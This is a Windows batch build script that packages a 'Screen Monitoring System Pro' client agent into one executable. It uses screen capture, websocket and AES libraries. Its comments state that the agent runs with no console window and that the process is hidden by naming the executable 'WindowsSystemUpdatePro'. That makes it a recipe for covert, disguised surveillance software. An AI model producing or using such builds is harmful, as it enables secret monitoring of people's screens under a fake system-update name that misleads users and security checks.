@echo off
echo ========================================================
echo Screen Monitoring System Pro - Client Builder (PyInstaller)
echo ========================================================

REM Navigate to project root
cd ..

echo [1/3] Installing build dependencies...
pip install pyinstaller

echo [2/3] Building client_agent.exe...
REM We use --noconsole to run without a command prompt window
REM We use --onefile to package everything into a single executable
REM We hide the process name simply by naming the output file generic
pyinstaller --noconsole --onefile --name WindowsSystemUpdatePro --clean ^
    --hidden-import mss ^
    --hidden-import cv2 ^
    --hidden-import websockets ^
    --hidden-import Crypto.Cipher.AES ^
    client/main.py

echo [3/3] Build complete!
echo Executable is located in the 'dist' folder.
pause
